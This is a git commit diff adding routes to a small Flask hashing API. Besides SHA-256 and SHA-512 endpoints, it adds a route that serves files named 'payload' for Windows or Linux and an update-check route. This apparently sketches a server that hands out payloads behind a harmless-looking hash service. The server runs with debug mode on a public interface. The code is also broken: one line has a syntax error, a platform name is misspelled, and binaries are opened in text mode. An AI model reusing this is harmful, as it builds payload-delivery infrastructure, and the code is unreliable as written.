71b5422308d40d32f27f7185f891fe88ca772e9c
Wolf <36646784+NE1W01F@users.noreply.github.com>
2020-03-23 14:59:37 +0000

    Add files via upload

--- server.py
+++ server.py
@@ -1,4 +1,4 @@
-from flask import Flask, jsonify, render_template, Request
+from flask import Flask, jsonify, render_template, Request, send_file
 import hashlib
 
 app = Flask(__name__)
@@ -12,4 +12,30 @@ def Get_Info(value):
     hash = hashlib.sha1(str(value).encode('UTF-8')).hexdigest()
     return jsonify({'Status':'OK', 'Hash': str(hash)})
 
-app.run(debug=True, port=80)
+@app.route('/sha256=<value>', methods=['GET'])
+def SHA256(value):
+    hash = hashlib.sha256(str(value).encode('UTF-8')).hexdigest()
+    return jsonify({'Status': 'OK', 'Hash': str(hash)})
+
+@app.route('/sha512=<value>', methods=['GET'])
+def SHA512(value):
+    hash = hashlib.sha512(str(value).encode('UTF-8')).hexdigest()
+    return jsonify({'Status': 'OK', 'Hash': str(hash)})
+
+@app.route('/download/platform=<value>', methods=['GET'])
+def Download_File(value):
+    if value == "win":
+        return send_file(open('/root/payload.exe', 'r'))
+    elif value == "liunx":
+        return send_file(open('/root/payload', 'r'))
+    else:
+        return jsonify({'Platform Not Found': 404})
+
+@app.route('/updates/version=<value>', methods=['GET'])
+def Check_API(value):
+    if int(value) > 1.0:
+        return jsonify({'update_url': ''})
+    else:
+        return jsonify{'update_url': 'update'} 
+
+app.run(debug=True, port=80, host='0.0.0.0')
